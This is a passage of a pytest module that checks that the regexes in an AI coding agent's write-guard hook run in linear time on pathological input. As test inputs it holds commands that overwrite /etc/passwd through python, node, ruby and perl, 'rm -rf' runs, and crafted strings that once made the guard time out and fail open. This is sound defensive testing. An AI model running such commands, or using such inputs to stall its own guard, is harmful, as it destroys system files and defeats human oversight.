r"""ReDoS regression tests for write_guard inline-interpreter regexes.

Pre-fix (post-v0.6.5 adversarial review finding): the body alternation
``(?:\\.|(?!\1).)*`` in ``_PYTHON_DASH_C_RE``, ``_NODE_DASH_E_RE``,
``_RUBY_DASH_E_RE``, and ``_PERL_DASH_E_RE`` had overlapping branches —
``\\.`` matched ``\X`` (2 chars starting with backslash), and
``(?!\1).`` matched any non-quote char (including ``\``). A run of
backslashes with no closing quote produced catastrophic backtracking
(>500ms at n>=40 backslashes; CC's hook timeout is 5s, exceeded easily).

Fix: change the second branch to ``(?!\1)[^\\]`` so the two
alternatives are mutually exclusive (one consumes a leading backslash;
the other excludes backslash). Runs in linear time on worst-case input.

This module pins:

1. Each pattern completes within 100ms on a worst-case 32KB
   unclosed-quote backslash-run payload.
2. Legitimate inline-interpreter invocations still match.

Add new patterns to ``_REGEX_TARGETS`` if write_guard learns another
interpreter family.

TP-169 §13 #5 (R0 C2): the four *inner* write-target regexes
(``_PY_FILE_OPEN_RE``, ``_NODE_FS_WRITE_RE``, ``_RUBY_FILE_WRITE_RE``,
``_PERL_OPEN_RE``) run over the captured interpreter body and were
previously absent from this module — the "inner regexes are exempt"
assumption was wrong. ``_PERL_OPEN_RE`` carried a lazy
``([^'"]+?)\\s*\\1`` whose two whitespace-matching quantifiers backtracked
catastrophically on an unclosed inner quote (verified >2s @ 1k spaces,
reachable through ``_PERL_DASH_E_RE -> _PERL_OPEN_RE`` in
``_candidate_paths_from_bash`` = a live PreToolUse slow-hook fail-open).
Fixed to a greedy whitespace-excluding ``([^'"\\s]+)\\1`` capture. All four
inner regexes are now pinned linear below via ``_INNER_WRITE_TARGET_REGEXES``.
"""
from __future__ import annotations

import ast
import gc
import re
import signal
import sys
import time
from collections.abc import Callable
from pathlib import Path
from typing import Literal

import pytest
from tests._live_tree import checkout_glob
from tests._platform_standin import without_the_alarm
from tests._pytest_ini import declared_pytest_timeout

sys.path.insert(
    0, str(Path(__file__).resolve().parent.parent / "tools" / "cc" / "hooks")
)
from write_guard import (  # noqa: E402
    _CP_MV_RE,
    _GIT_CHECKOUT_BARE_RE,
    _GIT_CHECKOUT_DASHDASH_RE,
    _GIT_RESTORE_RE,
    _HEREDOC_RE,
    _INTERP_STDIN_RE,
    _LN_S_RE,
    _NODE_DASH_E_RE,
    _NODE_FS_WRITE_RE,
    _PERL_DASH_E_RE,
    _PERL_OPEN3_RE,
    _PERL_OPEN_RE,
    _PY_DEST_ARG_WRITE_RE,
    _PY_FILE_OPEN_RE,
    _PY_PATH_WRITE_RE,
    _PYTHON_DASH_C_RE,
    _REDIRECT_RE,
    _RUBY_DASH_E_RE,
    _RUBY_FILE_WRITE_RE,
    _SED_INPLACE_RE,
    _TEE_RE,
)
import _bash_patterns  # noqa: E402
import _speedbump  # noqa: E402
import write_guard  # noqa: E402

# This module arms SIGALRM itself (a `setitimer` budget around each timed
# search), so pytest-timeout's per-test ceiling runs on its thread here: under
# the signal method the module's own `setitimer(ITIMER_REAL, 0)` would cancel
# the ceiling and its handler would catch the plugin's alarm. Pinned by
# tests/test_test_suite_contract.py::test_every_module_that_arms_sigalrm_declares_the_thread_method.
pytestmark = pytest.mark.timeout(method="thread")

_REGEX_TARGETS = [
    ("python", _PYTHON_DASH_C_RE, "-c"),
    ("node", _NODE_DASH_E_RE, "-e"),
    ("ruby", _RUBY_DASH_E_RE, "-e"),
    ("perl", _PERL_DASH_E_RE, "-e"),
]

# Extraction regexes that don't follow the inline-interpreter shape but
# also run over the (capped) Bash command body. None of these use a
# backreferenced quoted body — they extract simple word-shaped paths —
# so catastrophic backtracking is structurally unlikely. We still bound
# their worst-case time as belt-and-suspenders coverage.
_OTHER_BASH_EXTRACTION_REGEXES = [
    ("redirect", _REDIRECT_RE),
    # DEF-1039: the write-nothing redirects the compaction bump sets aside
    # before its write search (fd duplication, a closed fd, the null sink, the
    # terminal's streams); its adjacent quantifiers are each a different
    # character, pinned linear here like the extraction patterns beside it.
    ("inert_redirect", _speedbump._INERT_REDIRECT_RE),
    ("heredoc", _HEREDOC_RE),
    ("tee", _TEE_RE),
    ("sed_inplace", _SED_INPLACE_RE),
    ("cp_mv", _CP_MV_RE),
    ("git_checkout_dashdash", _GIT_CHECKOUT_DASHDASH_RE),
    ("git_checkout_bare", _GIT_CHECKOUT_BARE_RE),
    ("git_restore", _GIT_RESTORE_RE),
    ("ln_s", _LN_S_RE),  # Round 3: symlink creation
    # DEF-698: the stdin-program opener -- a bounded argument run after `-`,
    # every adjacent quantifier pair mutually exclusive.
    ("interp_stdin", _INTERP_STDIN_RE),
    # The Bash trio's third step (447-A, 2026-09-11): the pipe-to-stdin
    # opener, the shell here-string opener, the three statement readers'
    # heads, and every call-head regex the shell-out readers run over a
    # PROGRAM body -- the literal after each is read by hand, never by a
    # regex, so these carry no literal capture to backtrack into.
    ("interp_pipe", _bash_patterns._INTERP_PIPE_RE),
    ("shell_herestring", _bash_patterns._SHELL_HERESTRING_RE),
    ("awk_head", _bash_patterns._AWK_HEAD_RE),
    ("sed_head", _bash_patterns._SED_HEAD_RE),
    ("git_head", _bash_patterns._GIT_HEAD_RE),
    ("py_shell_out_head", _bash_patterns._PY_SHELL_OUT_HEAD_RE),
    ("js_shell_out_head", _bash_patterns._JS_SHELL_OUT_HEAD_RE),
    ("perl_shell_out_head", _bash_patterns._PERL_SHELL_OUT_HEAD_RE),
    ("perl_open_pipe", _bash_patterns._PERL_OPEN_PIPE_RE),
    ("perl_qx", _bash_patterns._PERL_QX_RE),
    ("ruby_shell_out_head", _bash_patterns._RUBY_SHELL_OUT_HEAD_RE),
    ("ruby_percent_x", _bash_patterns._RUBY_PERCENT_X_RE),
    ("awk_system", _bash_patterns._AWK_SYSTEM_RE),
    ("awk_string", _bash_patterns._AWK_STRING_RE),
    ("awk_getline", _bash_patterns._AWK_GETLINE_RE),
    ("awk_pipe_to_cmd", _bash_patterns._AWK_PIPE_TO_CMD_RE),
    ("sed_e_command", _bash_patterns._SED_E_COMMAND_RE),
    ("sed_s_e_flag", _bash_patterns._SED_S_E_FLAG_RE),
    ("awk_redirect_write", _bash_patterns._AWK_REDIRECT_WRITE_RE),
    ("sed_w_command", _bash_patterns._SED_W_COMMAND_RE),
    ("sed_s_w_flag", _bash_patterns._SED_S_W_FLAG_RE),
    ("heredoc_operator", _bash_patterns._HEREDOC_OPERATOR_RE),
    # DEF-815: the find opener now also feeds the catastrophic tier (a
    # bounded span, the action and narrowing tests a second anchored pass).
    ("find_delete", _bash_patterns._FIND_DELETE_RE),
    ("find_delete_action", _bash_patterns._FIND_DELETE_ACTION_RE),
    ("find_narrowing", _bash_patterns._FIND_NARROWING_RE),
    # DEF-826: the enumerator piped through xargs into a remove verb (two
    # bounded spans, the carrier's switch run one arm per token) and its
    # witness gate
    ("piped_remove", _bash_patterns._PIPED_REMOVE_RE),
    ("piped_carrier_witness", _bash_patterns._PIPED_CARRIER_WITNESS_RE),
    # DEF-830: the loop carrier's three enumerator openers (the enumerator
    # span, the loop head with the read builtin's switch run, a bounded body
    # run before the remove verb), DEF-837's word-list opener (a bounded run
    # of words, each opening on a non-blank) and their witness gate
    ("loop_remove", _bash_patterns._LOOP_REMOVE_RE),
    ("for_subst_remove", _bash_patterns._FOR_SUBST_REMOVE_RE),
    ("tail_loop_remove", _bash_patterns._TAIL_LOOP_REMOVE_RE),
    ("for_words_remove", _bash_patterns._FOR_WORDS_REMOVE_RE),
    ("loop_carrier_witness", _bash_patterns._LOOP_CARRIER_WITNESS_RE),
]

# ``_BASH_COMMAND_CAP`` in write_guard.py caps inputs at 32 KB. The bench
# uses a body just under that cap so we exercise the realistic worst case.
_WORST_CASE_BODY_LEN = 30000
_BUDGET_MS = 100  # documented design budget (SoT for the "100ms budget" doc claim)
#
# THE WALL-CLOCK RULE, one statement for every ceiling this file asserts
# (TP-225-E set it for the regex rows; DEF-922 made it the file's, 2026-09-24):
# the design budget stays documented; the ASSERTED ceiling is a named constant
# no less than TEN times a named, dated floor -- the slowest row's timed
# window, the minimum of three serial passes on the 8 GB self-host Air,
# recorded beside it with the load it was read at; the SIGALRM bound is the
# runaway detector, and a scaling arm, where a population has one, the shape
# detector. Why ten: a shared ubuntu runner reads about 1.65x this box on
# ordinary rows and over 3x on one (Release CI 35932546999, 2026-09-23), so
# twice the floor was crossed the first day CI ran again, and three times the
# floor -- where the chain rows below sat behind the regex rows' shared line
# -- went red on the 3.14 clean-checkout cell of the release tree's closing
# witness (CI 35954967897, the `quoted_literal_flood` row, 2026-09-24). The
# rule is derived, never remembered: tests/test_proof_tier.py::
# test_every_wall_clock_ceiling_is_ten_times_a_dated_floor walks every
# `setitimer` and elapsed comparison in the serial timing files and reds on a
# literal bound, a ceiling `_WALL_CLOCK_FLOORS` does not pair, a pair no row
# asserts, a ceiling under ten times its floor, a floor whose constant and
# pairing disagree, or a floor without a past date. Two things the rule holds
# fixed (failure-mode review): the reference host is the 8 GB self-host Air
# -- a floor read elsewhere is a different number, not a re-pin -- and A
# CEILING NEVER DROPS: the pairing records each floor's value with its date,
# so a floor edited alone reds until both move together, and the contract's
# high-water table reds a ceiling below the value it was pinned at, so a floor
# re-measured on a faster host cannot lower the line a slower runner is read
# against. To re-pin: measure (three serial passes, the minimum, the load
# noted), then move the floor constant, the pairing's value and its date in
# one edit; the derived ceiling may only rise.
#
# Three tiers, keyed on the floor band of the rows that share them.
#
# The REGEX tier: an isolated compiled pattern, or a chain whose floor is
# under a tenth of the line. Floor: `test_find_delete_tier_linear_through_the_chain`'s
# `git_preopt_flood` at 82.8 ms (2026-09-24, load 1.4-1.9); the isolated
# patterns read 1-31 ms. A LINEAR pattern can momentarily exceed the 100 ms
# design budget on a loaded host; the catastrophic-backtracking regression
# these rows guard is seconds, so the line still reds a real ReDoS while
# absorbing scheduler jitter.
_REGEX_FLOOR_MS = 85
_CI_SAFE_BUDGET_MS = 1000
# The CHAIN tier: a row that drives a whole extractor or reader over a flood
# at the cap -- `_candidate_paths_from_bash`, `_candidate_paths_from_powershell`,
# the remove/relocate readers, the switch/value run, the discard-snapshot arm.
# Until 2026-09-24 these nine rows shared the regex line at three to eight
# times their floors, three of them on bare literals. Floor:
# `test_ps_program_body_linear_on_unclosed_runs`'s `quoted_literal_flood` at
# 337.6 ms (2026-09-24, load 1.4-1.9; linear: 78 / 163 / 336 ms at 7.5 / 15 /
# 30 KB); the next chain rows read 246, 231, 220 and 198 ms.
_CHAIN_FLOOR_MS = 340
_CHAIN_CEILING_MS = 10 * _CHAIN_FLOOR_MS
# The WALKER tier: the Bash inert-syntax walker's consumers at 64 KB
# (`test_bash_walker_linear_on_opener_flood` and the scaling arm beside it)
# and the three walk rows at the end of the file (the delete walk, the two
# var-expansion pre-passes) -- a live judge over a flood, memoised readers
# cleared. Floor: `test_the_delete_walk_stays_linear_through_the_chain`'s
# `heredoc_flood` at 874.8 ms (2026-09-24, load 1.4-1.9; 577 / 871 ms min /
# max of five on 2026-09-23); the walker's `mixed_openers` 606.9 ms the same
# day (605.1 on 2026-09-22 at load 1.7-1.9, 540.6 / 600 at TP-454's
# authoring). The ceiling was first set at no less than twice the walker's
# floor, and a shared ubuntu runner exceeded it on `close_brace_run` the first
# day CI ran again (Release CI 35932546999, 2026-09-23); it was ten times
# that floor from then, and since 2026-09-24 ten times the tier's slowest row
# -- still well under the minutes a quadratic walker took before the fix,
# which is all it has to catch: the scaling arm is the detector for SHAPE
# (DEF-817), and this ceiling only catches a runaway. Coupled to the scaling
# row's time budget (DEF-5023, `_walker_row_budget_s`): a raised ceiling leaves
# that row less time in which a call may start, so re-read its pin with it.
_WALKER_FLOOR_MS = 880
_WALKER_CEILING_MS = 10 * _WALKER_FLOOR_MS

#: Every ceiling this file asserts, paired with the floor it is sized against,
#: the date that floor was read, and the floor's value at the pin. The contract
#: derives the ceilings from the timer and comparison sites, so a ceiling
#: missing here, or listed here and asserted nowhere, reds; a bound that is not
#: one of these names reds too; and a floor constant that disagrees with the
#: value recorded here reds until the constant, the value and the date move
#: together.
_WALL_CLOCK_FLOORS: dict[str, tuple[str, str, int]] = {
    "_CI_SAFE_BUDGET_MS": ("_REGEX_FLOOR_MS", "2026-09-24", 85),
    "_CHAIN_CEILING_MS": ("_CHAIN_FLOOR_MS", "2026-09-24", 340),
    "_WALKER_CEILING_MS": ("_WALKER_FLOOR_MS", "2026-09-24", 880),
}


class _Timeout(Exception):
    pass


def _alarm(_signum, _frame) -> None:
    raise _Timeout()


def test_every_row_here_is_timed_with_the_collector_paused():
    """The suite pauses the cyclic collector for this file's tests
    (`tests/conftest.py::_pause_the_collector_in_the_wall_clock_files`,
    DEF-5081): a full collection of the one-process run's heap that lands
    inside a window is the host's cost, not the consumer's, and on the release
    gate it read a 36 ms probe past the 1000 ms ceiling. Red here means a row
    of this file is timed with that term in it again."""
    assert not gc.isenabled()


@pytest.mark.parametrize("name,pattern,flag", _REGEX_TARGETS)
def test_regex_linear_on_backslash_run(name, pattern, flag):
    """Pattern completes within 100ms on a 30KB unclosed-quote
    backslash-run payload.

    POSIX-only — uses ``signal.alarm`` which is unavailable on Windows.
    """
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    body = "\\" * _WORST_CASE_BODY_LEN
    payload = f'{name} {flag} "{body}'

    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
    t = time.time()
    try:
        pattern.findall(payload)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(
            f"{name} regex exceeded {_CI_SAFE_BUDGET_MS}ms on 30KB backslash-run "
            f"payload (catastrophic backtracking — ReDoS regressed)"
        )
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CI_SAFE_BUDGET_MS, (
        f"{name} regex took {elapsed_ms:.1f}ms (budget {_CI_SAFE_BUDGET_MS}ms)"
    )


@pytest.mark.parametrize("name,pattern,flag", _REGEX_TARGETS)
def test_regex_linear_on_mixed_escape_run(name, pattern, flag):
    """Pattern completes within 100ms on a mixed escape-sequence + quote
    payload (the second known catastrophic-backtracking shape)."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    chunk = '\\"abc\\\\'  # 8 chars: \" a b c \\ — each can be parsed as escape or literal
    body = chunk * (_WORST_CASE_BODY_LEN // len(chunk))
    payload = f'{name} {flag} "{body}'

    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
    t = time.time()
    try:
        pattern.findall(payload)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(
            f"{name} regex exceeded {_CI_SAFE_BUDGET_MS}ms on mixed-escape payload"
        )
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CI_SAFE_BUDGET_MS


@pytest.mark.parametrize(
    "name,pattern,flag,payload",
    [
        ("python", _PYTHON_DASH_C_RE, "-c",
         'python -c "open(\'/etc/passwd\',\'w\')"'),
        ("python", _PYTHON_DASH_C_RE, "-c",
         'python3 -B -c "import os; os.makedirs(\'/tmp/x\')"'),
        ("node", _NODE_DASH_E_RE, "-e",
         'node -e "require(\'fs\').writeFileSync(\'/etc/passwd\',\'x\')"'),
        ("ruby", _RUBY_DASH_E_RE, "-e",
         'ruby -e "File.write(\'/etc/passwd\',\'x\')"'),
        ("perl", _PERL_DASH_E_RE, "-e",
         'perl -e "open(F,\'>\',\'/etc/passwd\')"'),
        ("python", _PYTHON_DASH_C_RE, "-c",
         'python -c "print(\\"hi\\")"'),  # escaped quote in body
        # DEF-832: a program operand of adjacent segments is one word
        ("python", _PYTHON_DASH_C_RE, "-c",
         "python3 -c 'import os; os.system(\"cp x '\"'\"'y'\"'\"'\")'"),
        ("python", _PYTHON_DASH_C_RE, "-c", "python3 -c 'print(1)'\"; print(2)\"'; print(3)'"),
        ("node", _NODE_DASH_E_RE, "-e", "node -e 'console.log(1)'x'; console.log(2)'"),
    ],
)
def test_regex_still_matches_legitimate_input(name, pattern, flag, payload):
    """The ReDoS fix must not regress the detection behavior."""
    assert pattern.search(payload) is not None, (
        f"{name} {flag} regex no longer matches legitimate payload "
        f"after ReDoS fix: {payload!r}"
    )


# ── Sister-site ReDoS coverage for other write_guard extraction regexes ─────
#
# Surfaced by the post-v0.6.6 adversarial review: the BOM bypass + ReDoS
# fixes covered the four inline-interpreter regexes, but adversarial-
# reviewer flagged that other extraction patterns running over the same
# 32KB-capped Bash command body should be audited too. None of these
# patterns use a backreferenced quoted body (the structural source of
# catastrophic backtracking we fixed), but bounding their worst-case
# time as a regression pin is cheap insurance against future refactor
# drift that might introduce the pattern shape.


@pytest.mark.parametrize("name,pattern", _OTHER_BASH_EXTRACTION_REGEXES)
def test_other_extraction_regex_linear_on_long_input(name, pattern):
    """Each non-interpreter extraction regex completes within
    ``_CI_SAFE_BUDGET_MS`` on a 30KB pathological-ish input (``_BUDGET_MS`` is
    the documented design budget; the asserted line is the CI-safe ceiling).

    We test three shapes:
      - very long whitespace (stresses ``\\s+`` quantifiers)
      - very long path-like word (stresses character classes like
        ``[^\\s<>|&;]+``)
      - long alternation of redirect / tee / pipe tokens
    """
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    payloads = [
        " " * _WORST_CASE_BODY_LEN,
        "a" * _WORST_CASE_BODY_LEN,
        ("> /tmp/foo " * (_WORST_CASE_BODY_LEN // 12))[:_WORST_CASE_BODY_LEN],
    ]
    for payload in payloads:
        signal.signal(signal.SIGALRM, _alarm)
        signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
        t = time.time()
        try:
            pattern.findall(payload)
            elapsed_ms = (time.time() - t) * 1000
        except _Timeout:
            pytest.fail(
                f"{name} regex exceeded {_CI_SAFE_BUDGET_MS}ms on a "
                f"{_WORST_CASE_BODY_LEN}-byte payload"
            )
        finally:
            signal.setitimer(signal.ITIMER_REAL, 0)
        assert elapsed_ms < _CI_SAFE_BUDGET_MS, (
            f"{name} regex took {elapsed_ms:.1f}ms on a "
            f"{_WORST_CASE_BODY_LEN}-byte payload "
            f"(budget {_CI_SAFE_BUDGET_MS}ms)"
        )


# post_write_check's write-time advisory (TP-450) runs its delete pattern over
# every string constant of a .py file Claude writes, up to the hook's 128 KiB
# read cap. The dot-star sweep above cannot see this pattern's risk: the
# census's flag class `[A-Za-z]*[rRf][A-Za-z]*` was quadratic on a long flag run
# (6, 24 and 97 ms at 1k, 2k and 4k letters), so the hook re-spells the run with
# a lookahead and this hand-added pin holds it linear: one hostile run per
# quantifier the pattern holds.
_DRIVER_DELETE_RUNS = {
    "a flag run holding r, no space after it": "rm -" + "r" * _WORST_CASE_BODY_LEN,
    "a flag run with no r, R or f": "rm -" + "x" * _WORST_CASE_BODY_LEN + " ",
    "a whitespace run after the flags": "rm -rf " + " " * _WORST_CASE_BODY_LEN,
    "a word run after the variable sign": "rm -rf $" + "a" * _WORST_CASE_BODY_LEN,
    "repeated delete heads": ("rm -r " * _WORST_CASE_BODY_LEN)[:_WORST_CASE_BODY_LEN],
    "repeated open variables": ('rm -rf "$V' * _WORST_CASE_BODY_LEN)[:_WORST_CASE_BODY_LEN],
}


@pytest.mark.parametrize("name,payload", sorted(_DRIVER_DELETE_RUNS.items()))
def test_driver_delete_regex_linear_on_a_hostile_run(name, payload):
    """``post_write_check._DRIVER_DELETE_RE`` finishes each hostile run within
    ``_CI_SAFE_BUDGET_MS`` (the census's own spelling took 5.5 s on the flag
    run at this length, measured 2026-11-07, so two such constants in one file
    would pass the hook's 10 s timeout)."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    from post_write_check import _DRIVER_DELETE_RE  # noqa: E402

    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
    t = time.time()
    try:
        _DRIVER_DELETE_RE.findall(payload)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(f"the driver delete pattern exceeded {_CI_SAFE_BUDGET_MS}ms on {name}")
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CI_SAFE_BUDGET_MS, (
        f"the driver delete pattern took {elapsed_ms:.1f}ms on {name} (budget {_CI_SAFE_BUDGET_MS}ms)"
    )


# The external-pin quote check normalises whole upstream pages (DEF-744), so
# its rules face page-sized input: one hostile run per rule, of the characters
# that rule consumes.
_QUOTE_NORMALISER_RUNS = {
    "spaces": " ", "dashes": "-", "bars": "|", "brackets": "[", "backslashes": "\\",
    "tag-openers": "<a", "dash-separators": " -- ", "link-openers": "[x](", "escapes": "\\_",
    "quote-markers": " >", "quote-lines": "\n >",
}


@pytest.mark.parametrize("name,unit", sorted(_QUOTE_NORMALISER_RUNS.items()))
def test_quote_normaliser_linear_on_a_hostile_run(name, unit):
    """``espalier.external_diff.normalize_page_text`` (the page's blockquote
    markers, then ``normalize_quote_text``) finishes within
    ``_CI_SAFE_BUDGET_MS`` on a ``_WORST_CASE_BODY_LEN`` run. Its two link
    classes were quadratic until each stopped at the bracket that opens the
    next attempt: 47 s on 20,000 `[` and 29 s on 37,500 `[x](`, driven
    2026-10-10 on the Windows host."""
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    from espalier.external_diff import normalize_page_text

    payload = (unit * (_WORST_CASE_BODY_LEN // len(unit) + 1))[:_WORST_CASE_BODY_LEN]
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
    t = time.time()
    try:
        normalize_page_text(payload)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(f"the quote normaliser exceeded {_CI_SAFE_BUDGET_MS}ms on a {name} run")
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CI_SAFE_BUDGET_MS, (
        f"the quote normaliser took {elapsed_ms:.1f}ms on a {_WORST_CASE_BODY_LEN}-byte "
        f"{name} run (budget {_CI_SAFE_BUDGET_MS}ms)"
    )


# ── Inner write-target regex ReDoS coverage (TP-169 §13 #5 / R0 C2) ─────────
#
# The four inner regexes extract a quoted literal write path out of an
# interpreter ``-e``/``-c`` body (the OUTER regexes above capture the body;
# these scan it). Pre-TP-169 they were absent from this module on the wrong
# assumption that "literal-string-only" inner patterns can't ReDoS.
# ``_PERL_OPEN_RE`` disproved that: its lazy ``([^'"]+?)\s*\1`` had two
# whitespace-matching quantifiers straddling a single whitespace run, so an
# unclosed inner quote backtracked catastrophically. Each tuple's prefix opens
# the regex's quoted write-path literal but never closes it, so the path
# capture runs to the end of the payload — the worst case for backtracking.

_INNER_WRITE_TARGET_REGEXES = [
    ("py_open", _PY_FILE_OPEN_RE, "open('"),
    ("node_write", _NODE_FS_WRITE_RE, "writeFileSync('"),
    ("ruby_write", _RUBY_FILE_WRITE_RE, "File.write('"),
    ("perl_open", _PERL_OPEN_RE, "open(F, '>"),
    # DEF-813: the three-argument spelling; the path literal opens after the
    # second comma and never closes
    ("perl_open3", _PERL_OPEN3_RE, "open(my $fh, '>', '"),
    ("perl_open3_read", _bash_patterns._PERL_OPEN3_READ_RE, "open(my $fh, '<', '"),
    # DEF-698: the pathlib and destination-argument writers.
    ("py_path_write", _PY_PATH_WRITE_RE, "Path('"),
    ("py_dest_arg", _PY_DEST_ARG_WRITE_RE, "shutil.copy('/tmp/x', '"),
]


@pytest.mark.parametrize("name,pattern,prefix", _INNER_WRITE_TARGET_REGEXES)
def test_inner_write_target_regex_linear(name, pattern, prefix):
    """Each inner write-target regex completes within ``_CI_SAFE_BUDGET_MS`` (the
    asserted ceiling; ``_BUDGET_MS`` is the documented design budget) on a 30KB
    unclosed-quote payload, in both a whitespace-run and a printable-run shape.

    The whitespace-run shape is the exact pre-fix ``_PERL_OPEN_RE`` killer
    (a quote/whitespace overlap); the printable-run stresses the greedy class.
    POSIX-only — uses ``signal.alarm`` (unavailable on Windows).
    """
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    for body in (" " * _WORST_CASE_BODY_LEN, "a" * _WORST_CASE_BODY_LEN):
        payload = prefix + body
        signal.signal(signal.SIGALRM, _alarm)
        signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
        t = time.time()
        try:
            pattern.findall(payload)
            elapsed_ms = (time.time() - t) * 1000
        except _Timeout:
            pytest.fail(
                f"{name} inner regex exceeded {_CI_SAFE_BUDGET_MS}ms on a 30KB "
                f"unclosed-quote payload (catastrophic backtracking — "
                f"ReDoS in an inner write-target regex)"
            )
        finally:
            signal.setitimer(signal.ITIMER_REAL, 0)
        assert elapsed_ms < _CI_SAFE_BUDGET_MS, (
            f"{name} inner regex took {elapsed_ms:.1f}ms (budget {_CI_SAFE_BUDGET_MS}ms)"
        )


def test_perl_open_re_earns_the_red_on_unclosed_inner_quote():
    """Earn-the-red for TP-169 R0 C2 directly through the live extraction
    chain: the documented attack (``perl -e "open(F, '> <space-run>"``, outer
    double-quote closing, inner single-quote unclosed) must complete fast.

    Pre-fix this hung >2s @ 1k spaces / timed out @ 2k (a PreToolUse
    slow-hook fail-open); the SIGALRM bound here is `_CI_SAFE_BUDGET_MS`, so the pre-fix regex
    fails this test and the fixed regex passes (measured <1ms).
    """
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    # Import the real extraction chain — proves reachability, not just the
    # isolated regex.
    from _bash_patterns import _candidate_paths_from_bash  # noqa: E402

    command = 'perl -e "open(F, ' + "'>" + (" " * 8000) + '"'
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
    t = time.time()
    try:
        _candidate_paths_from_bash(command)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(
            f"_candidate_paths_from_bash exceeded {_CI_SAFE_BUDGET_MS}ms on the perl unclosed-"
            "inner-quote ReDoS payload — PreToolUse slow-hook fail-open "
            "(TP-169 R0 C2 regressed)"
        )
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CI_SAFE_BUDGET_MS


@pytest.mark.parametrize("mode_run", [">", "+", ">+"])
def test_perl_open_re_linear_on_mode_char_run(mode_run):
    """Regression for the v1 ReDoS that the first C2 fix re-introduced.

    The first fix (``[>+]+\\s*([^'"\\s]+)\\1``) traded the whitespace overlap for
    a mode-char overlap: ``[>+]`` is a subset of ``[^'"\\s]``, so an unclosed
    inner quote after a ``>``/``+`` run (``perl -e "open(F,'>>>>...``) split the
    mode run O(n) ways -> quadratic (3.7s @ 16k through the chain). The
    whitespace-run / ``'a'``-run cases above CANNOT catch this because their
    first path char is never a mode char. The v2 fix excludes mode chars from
    the path's first position. Driven end-to-end through the real chain with a
    CLOSED outer quote (so ``_PERL_DASH_E_RE`` matches and the inner regex runs).
    """
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    from _bash_patterns import _candidate_paths_from_bash  # noqa: E402

    n = 16000 // len(mode_run)
    # closed outer double-quote; unclosed inner single-quote; mode-char run
    command = 'perl -e "open(F,' + "'" + (mode_run * n) + '"'
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
    t = time.time()
    try:
        _candidate_paths_from_bash(command)
        elapsed_ms = (time.time() - t) * 1000
    except _Timeout:
        pytest.fail(
            f"_candidate_paths_from_bash exceeded {_CI_SAFE_BUDGET_MS}ms on a {mode_run!r}-run "
            "perl ReDoS payload — the C2 fix re-introduced quadratic "
            "backtracking via a mode-char/path-class overlap (TP-169 §13 #5 v1)"
        )
    finally:
        signal.setitimer(signal.ITIMER_REAL, 0)
    assert elapsed_ms < _CI_SAFE_BUDGET_MS


@pytest.mark.parametrize(
    "shape,make_body",
    [
        # a1: leading-whitespace run between `open` and `(` (the v2 prefix
        # double-whitespace-around-optional-paren split).
        ("prefix-space-run", lambda n: "open" + " " * n + "(F,'>a"),
        # a2: many `open(` tokens — finditer retries at each, greedy \S+
        # backtracks (the v2 prefix; closed by the (-excluding filehandle).
        ("many-open-paren", lambda n: "open(" * (n // 5) + "X,'>a"),
        # b1: `openopen...` with no comma — finditer retries at every `open`
        # literal, each an O(remaining) scan (closed by the word-boundary
        # lookbehind so only the first `open` is a valid start).
        ("repeated-open-no-comma", lambda n: "open" * (n // 4)),
    ],
)
def test_perl_open_re_linear_on_prefix_shapes(shape, make_body):
    """Regression for the v2 PREFIX ReDoS the third C2 adversarial round found.

    v0/v1/v2 all hardened the regex TAIL; the prefix
    ``open\\s*\\(?\\s*\\S+\\s*,\\s*`` still went quadratic three ways — a leading
    space run (5s @ 31k = the 5s PreToolUse timeout = fail-open), many ``open(``
    tokens, and a comma-less ``openopen`` run (finditer re-scanning at every
    ``open``). The v3 fix (word-boundary lookbehind + single-whitespace prefix +
    paren/comma-excluding filehandle) makes all linear. Driven end-to-end through
    the real chain with a CLOSED outer quote so ``_PERL_DASH_E_RE`` matches.
    """
    if not hasattr(signal, "SIGALRM"):
        pytest.skip("signal.alarm not available on this platform")
    from _bash_patterns import _candidate_paths_from_bash  # noqa: E402

    command = 'perl -e "' + make_body(28000) + '"'
    signal.signal(signal.SIGALRM, _alarm)
    signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
    t = time.time()
    try:
        _candidate_paths_from_bash(command)
